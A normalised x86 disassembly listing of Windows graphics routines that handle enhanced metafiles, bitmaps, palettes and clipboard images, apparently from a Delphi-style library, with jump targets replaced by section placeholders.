movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4027b4
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42ab23
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_428040
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ab2a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4027d4
retn
call sub_428040
sub_42ab34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42abdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_42abb9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408b18
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c99c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40452c
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_429594
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42abc0
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_42ac14
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_42ae68
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esp
push 0x64
push esi
call GetEnhMetaFileHeader
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4260ac
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] esi
xor edx edx
mov [ eax + 0x1c ] edx
xor edx edx
mov [ eax + 0x20 ] edx
test esi esi
je r-xdata
push eax
call DeleteEnhMetaFile
call sub_428040
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esp 0x64
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
mov [ eax + 0x10 ] edx
sub_42aca4
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42a850
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42ad18
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42ad18
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_42ad18
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_42a850
pop esi
pop ebx
retn
mov eax ebx
call sub_42ae68
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42ad54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_42a850
pop esi
pop ebx
retn
mov eax ebx
call sub_42ae68
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42ad94
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42a850
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42ad54
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42ad54
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_42ae08
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41dba4
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_42ae68
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_42a850
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_42b5d0
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_42b5cc
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_42aeec
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41dba4
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_42aff8
mov edx ebx
mov eax esi
call sub_42af6c
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_42af6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42afe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41de08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027d4
retn
sub_42aff8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402da4
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41de08
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41de08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b11a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027d4
retn
call sub_4280a0
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_428e90
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42b133
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4027b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b113
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_42b140
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42a850
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_428010
sub_42b1c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_42b2b0
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41ba18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42b34e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b355
mov eax [ rw-data ]
call sub_41ba7c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42b326
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_42b440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_427c48
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b654
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_427bec
test al al
je r-xdata
sub_42b35c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41ba18
mov esi eax
xor ecx ecx
push ebp
push sub_42b3cc
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
mov edx ebx
mov eax esi
call sub_41b654
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_42b440
sub_42b3d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_427758
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42b414
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_42b440
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42781c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42b440
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_427a5c
xor edx edx
push ebp
push sub_42b4d4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_427dd0
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ba2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_427c48
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_42b4e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_427a5c
xor eax eax
push ebp
push sub_42b5bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42c7fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_42b35c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42c8fc
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_427dd0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b990
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_427c48
retn
sub_42b5d0
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403390
sub_42b5f0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_42b35c
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d7a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42b64c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_4260ac
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_42b35c
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_42b35c
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_42b698
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4288dc
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42b747
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42b754
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_42b7a0
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b35c
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_428148
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_428148
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_42bdee
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4027b4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_42baf8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_428028
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_428148
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_428148
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_428148
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_428148
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42bd9f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42bd8e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_42bd6c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_428148
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_42b754
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4029b0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4288dc
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42763c
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_41a018
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
